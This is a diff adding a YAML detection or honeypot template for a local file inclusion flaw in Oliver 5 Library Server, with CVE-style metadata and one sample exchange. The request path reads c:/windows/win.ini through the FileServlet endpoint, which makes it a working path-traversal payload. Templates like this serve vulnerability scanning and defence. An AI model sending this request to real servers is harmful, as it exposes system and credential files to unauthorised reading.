@@ -1,0 +1,27 @@
+id: oliver-library-lfi
+info:
+  name: Oliver 5 Library Server <8.00.008.053 - Local File Inclusion
+  author: gy741
+  description: Oliver 5 Library Server versions prior to 8.00.008.053 are vulnerable
+    to local file inclusion via the FileServlet function.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/50599
+  - https://www.softlinkint.com/product/oliver/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: lfi,oliver,edb,windows
+traps:
+- request:
+    method: GET
+    path: /oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: bit app supportfontsextensions
